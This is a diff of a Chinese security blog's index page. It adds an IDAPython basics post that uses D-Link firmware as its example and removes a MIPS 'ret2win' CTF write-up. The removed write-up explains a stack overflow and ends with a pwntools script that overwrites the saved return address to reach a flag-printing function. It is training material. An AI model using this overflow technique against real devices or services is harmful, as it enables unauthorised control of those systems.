@@ -168,6 +168,91 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
+    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/06/IDAPython-%E5%9F%BA%E7%A1%80/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="OneShell">
+      <meta itemprop="description" content="菜">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="OneShell">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2023/04/06/IDAPython-%E5%9F%BA%E7%A1%80/" class="post-title-link" itemprop="url">IDAPython-基础</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+
+              <time title="Created: 2023-04-06 01:18:57" itemprop="dateCreated datePublished" datetime="2023-04-06T01:18:57+08:00">2023-04-06</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">Edited on</span>
+                <time title="Modified: 2023-04-11 14:00:50" itemprop="dateModified" datetime="2023-04-11T14:00:50+08:00">2023-04-11</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">In</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/" itemprop="url" rel="index"><span itemprop="name">工具党</span></a>
+                </span>
+                  , 
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E5%B7%A5%E5%85%B7%E5%85%9A/IDAPython/" itemprop="url" rel="index"><span itemprop="name">IDAPython</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>我打算整理和总结一下IDAPython相关的笔记，由于使用的场景大多是在IoT领域，此处和后续的笔记采用了dir-850l固件中的cgibin（漏洞多）来作为演示。个人笔记，也不讲究通用性了，如果能被其他人作为有用参考就用叭。</p>
+<p>在学习IDAPython之初，需要了解一下IDA反汇编窗口输出的内容和结构。<br>以IDA反汇编窗口中的一条指令为例，如下的<code>sw</code>存储指令（最近在看MIPS），如下指令功能是将寄存器<code>ra</code>中的值保存到栈上：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:00429000 sw      $ra, 0x418+var_s10($sp)</span><br></pre></td></tr></table></figure>
+<p>其中，<code>.text</code>是section名，也就是text节；00429000是地址，IDA中会省略掉前缀0x；<code>sw</code>是指令助记符，随后是第一个操作数<code>ra</code>和第二个操作数<code>0x418+var_s10($sp)</code>。<br>在IDAPython中，指令地址是经常被传入到API函数中进行处理的参数，API描述中使用<code>ea</code>表示，如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">idc.get_segm_name(ea)        <span class="comment"># 获取当前光标所在指令的地址</span></span><br><span class="line">idc.GetDisasm(ea)            <span class="comment"># 获取反汇编指令</span></span><br><span class="line">idc.print_insn_mnem(ea)      <span class="comment"># 打印指令助记符</span></span><br><span class="line">idc.print_operand(ea, <span class="number">0</span>)     <span class="comment"># 打印第一个操作数</span></span><br><span class="line">idc.print_operand(ea, <span class="number">1</span>)     <span class="comment"># 打印第二个操作数</span></span><br></pre></td></tr></table></figure>
+<p>IDAPython使用得比较频繁的一个操作就是获取到反汇编窗口光标所在的行的地址，可以使用<code>idc.get_screen_ea()</code>来获取，也可以直接使用<code>here()</code>获取。但如果在IDAPython脚本中不能直接使用<code>here()</code>，必须保证<code>import idc</code>，然后使用<code>idc.here()</code>。<br>对于初学者使用IDAPython最简单的方式就是在IDA最下方的命令行中直接进行操作：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Python&gt;ea = idc.here()</span><br><span class="line">Python&gt;<span class="built_in">print</span>(<span class="string">&quot;0x%x, %s&quot;</span> % (ea, ea))</span><br><span class="line"><span class="number">0x40012c</span>, <span class="number">4194604</span></span><br><span class="line">Python&gt;idc.get_segm_name(ea)</span><br><span class="line"><span class="string">&#x27;.text&#x27;</span></span><br><span class="line">Python&gt;idc.GetDisasm(ea)</span><br><span class="line"><span class="string">&#x27;li      $gp, 0x492900&#x27;</span></span><br><span class="line">Python&gt;idc.print_insn_mnem(ea)</span><br><span class="line"><span class="string">&#x27;li&#x27;</span></span><br><span class="line">Python&gt;idc.print_operand(ea, <span class="number">0</span>)</span><br><span class="line"><span class="string">&#x27;$gp&#x27;</span></span><br><span class="line">Python&gt;idc.print_operand(ea, <span class="number">1</span>)</span><br><span class="line"><span class="string">&#x27;0x492900&#x27;</span></span><br></pre></td></tr></table></figure>
+<p>对于指令的操作数的类型和值，具体还可以使用<code>idc.get_operand_type()</code>和<code>idc.get_operand_value()</code>来获得，这将在后续的笔记中进行简单说明。</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
     <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/04/04/ret2csu_mipsel/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1026,117 +1111,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-Hans">
-    <link itemprop="mainEntityOfPage" href="https://oneshell.top/2023/03/15/ret2win_mipsel/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="OneShell">
-      <meta itemprop="description" content="菜">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="OneShell">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2023/03/15/ret2win_mipsel/" class="post-title-link" itemprop="url">ret2win_mipsel</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2023-03-15 10:11:03" itemprop="dateCreated datePublished" datetime="2023-03-15T10:11:03+08:00">2023-03-15</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2023-04-11 13:56:58" itemprop="dateModified" datetime="2023-04-11T13:56:58+08:00">2023-04-11</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/" itemprop="url" rel="index"><span itemprop="name">PWN</span></a>
-                </span>
-                  , 
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/PWN/MIPSROP/" itemprop="url" rel="index"><span itemprop="name">MIPSROP</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>开始做第一个题目：ret2win。</p>
-<h2 id="MIPS指令基本分析"><a href="#MIPS指令基本分析" class="headerlink" title="MIPS指令基本分析"></a>MIPS指令基本分析</h2><p>首先简单对MIPS程序的指令进行分析。</p>
-<p>函数初始化过程：</p>
-<ul>
-<li>首先是开辟栈帧，通过给sp寄存器加上一个负数的方式，来开辟栈帧空间。</li>
-<li>保存ra寄存器到栈上，即将函数执行完毕后的返回地址到本函数的栈上，因为本函数如果调用了子函数，ra寄存器会被使用。</li>
-<li>保存fp寄存器到栈上，fp中保存了上一个函数的栈顶，也就是上一个函数的sp。</li>
-<li>将当前的栈顶sp保存到fp中，现在不是很能说清楚这个操作的含义，可能是用来在调用子函数的时候，恢复本函数的栈顶</li>
-<li>读取GOT上的偏移到gp中，然后将gp的值保存到栈上。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.text:00400830 addiu   $sp, -0x20       # 开辟栈帧</span><br><span class="line">.text:00400834 sw      $ra, 0x18+var_s4($sp)  # 保存函数返回地址到栈上</span><br><span class="line">.text:00400838 sw      $fp, 0x18+var_s0($sp)  # 保存栈帧寄存器到栈上</span><br><span class="line">.text:0040083C move    $fp, $sp  </span><br><span class="line">.text:00400840 li      $gp, (_GLOBAL_OFFSET_TABLE_+0x7FF0)</span><br><span class="line">.text:00400848 sw      $gp, 0x18+var_8($sp)  # 将gp也保存到了栈上</span><br></pre></td></tr></table></figure>
-对于ra寄存器，是用来保存返回地址的（return address），在MIPS的缓冲区溢出中，需要通过溢出修改掉在函数初始化时保存在栈上的ra寄存器值。等函数执行完毕之后，就从栈上恢复值到ra寄存器，并跳转执行。意思就是，MIPS架构中劫持ra寄存器是劫持控制流的关键。</li>
-</ul>
-<p>函数的退出过程：</p>
-<ul>
-<li>从栈上恢复先前保存的gp</li>
-<li>给v0寄存器赋值0，v0和v1寄存器一般用来保存函数的返回值</li>
-<li>将fp赋值给sp，但是在本函数中没有操作sp和fp，因此，sp&#x3D;sp没有发生变化</li>
-<li>从栈上恢复ra和fp，也就是恢复函数返回地址、上一个函数的fp</li>
-<li>恢复栈帧，实现堆栈平衡</li>
-<li>跳转到ra，也就是函数返回地址，随后的一个nop指令是指令延迟槽，会被执行<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:004008D4 lw      $gp, 0x18+var_8($fp)</span><br><span class="line">.text:004008D8 move    $v0, $zero</span><br><span class="line">.text:004008DC move    $sp, $fp</span><br><span class="line">.text:004008E0 lw      $ra, 0x18+var_s4($sp)</span><br><span class="line">.text:004008E4 lw      $fp, 0x18+var_s0($sp)</span><br><span class="line">.text:004008E8 addiu   $sp, 0x20</span><br><span class="line">.text:004008EC jr      $ra</span><br><span class="line">.text:004008F0 nop</span><br></pre></td></tr></table></figure></li>
-</ul>
-<p>一个函数跳转的实现：</p>
-<ul>
-<li>MIPS架构中，小于等于4个参数使用寄存器a0~a3进行参数传递</li>
-<li>在调用setvbuf时，先将函数地址赋值给v0，然后再赋值给t9，最后jalr跳转到函数执行</li>
-<li>jalr跳转指令下还有一个nop指令，这个指令是MIPS的分支延迟槽，分支延迟槽和MIPS的流水线相关，此处不展开细说，大概就是分支（b指令）和跳转（j指令）后的一条指令会随着分支和跳转指令执行完毕后自动执行。分支延迟槽也通常被用于设置一个函数传参，例如就可以把li $a2, 2这条指令放到分支延迟槽中。<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.text:00400854 move    $a3, $zero       # n</span><br><span class="line">.text:00400858 li      $a2, 2           # modes</span><br><span class="line">.text:0040085C move    $a1, $zero       # buf</span><br><span class="line">.text:00400860 move    $a0, $v0         # stream</span><br><span class="line">.text:00400864 la      $v0, setvbuf</span><br><span class="line">.text:00400868 move    $t9, $v0</span><br><span class="line">.text:0040086C jalr    $t9 ; setvbuf</span><br><span class="line">.text:00400870 nop</span><br></pre></td></tr></table></figure></li>
-</ul>
-<h2 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pwnme</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> v1[<span class="number">32</span>]; <span class="comment">// [sp+18h] [+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(v1, <span class="number">0</span>, <span class="keyword">sizeof</span>(v1));</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What could possibly go wrong?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;You there, may I have your input please? And don&#x27;t worry about null bytes, we&#x27;re using read()!\n&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, v1, <span class="number">0x38</span>u);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">puts</span>(<span class="string">&quot;Thank you!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>缓冲区起始地址sp+18h，ra保存在sp+3ch，因此，填充24h&#x3D;36字节，随后的4个字节数据便可以覆盖掉函数返回地址。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.text:004008F8 sw      $ra, 0x38+var_s4($sp)</span><br></pre></td></tr></table></figure>
-<p>构造字符串如下，便可以覆盖掉返回地址为：dead</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">aaaabaaacaaadaaaeaaafaaagaaahaaaiaaadead</span><br><span class="line">*PC   0x64616564 (&#x27;dead&#x27;)</span><br></pre></td></tr></table></figure>
-<p>通过搜索字符串，可以看到有一个函数ret2win提供了输入flag的命令，那么ROP跳转过去即可</p>
-<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">ret2win</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Well done! Here&#x27;s your flag:&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;/bin/cat flag.txt&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">BINARY = <span class="string">&quot;./ret2win_mipsel&quot;</span></span><br><span class="line">ELF = ELF(BINARY)</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&quot;linux&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;mips&quot;</span></span><br><span class="line">context.binary = BINARY</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;10.0.0.2&quot;</span>, <span class="number">9999</span>)</span><br><span class="line"></span><br><span class="line">rop = <span class="string">b&quot;A&quot;</span> * <span class="number">36</span></span><br><span class="line">rop += p32(ELF.symbols[<span class="string">&quot;ret2win&quot;</span>])</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;raw&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(rop)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(rop)</span><br><span class="line"><span class="keyword">for</span> each <span class="keyword">in</span> p.recvlines(<span class="number">10</span>):</span><br><span class="line">    <span class="keyword">if</span> re.findall(<span class="string">&quot;ROPE&quot;</span>, <span class="built_in">str</span>(each)):</span><br><span class="line">        flag = each</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1206,7 +1180,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">33</span>
+          <span class="site-state-item-count">34</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
